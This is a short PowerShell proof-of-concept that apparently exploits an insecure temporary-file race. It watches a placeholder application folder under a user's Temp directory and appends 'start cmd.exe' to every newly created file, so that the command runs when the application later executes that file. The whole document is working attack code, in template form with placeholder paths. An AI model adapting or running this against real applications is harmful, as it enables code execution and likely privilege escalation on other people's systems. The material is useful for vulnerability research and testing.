Get-EventSubscriber | Unregister-Event
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users\IEUser\AppData\Local\Temp\VULNERABLEAPPFOLDER\"
$watcher.Filter = "ANYFILE.ANYEXTENSION"  
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

$action = 
{
  $path = $event.SourceEventArgs.FullPath
  $changetype = $event.SourceEventArgs.ChangeType
  write-host "ok"
  Add-Content $path "start cmd.exe"  
}

Register-ObjectEvent $watcher 'Created' -Action $action
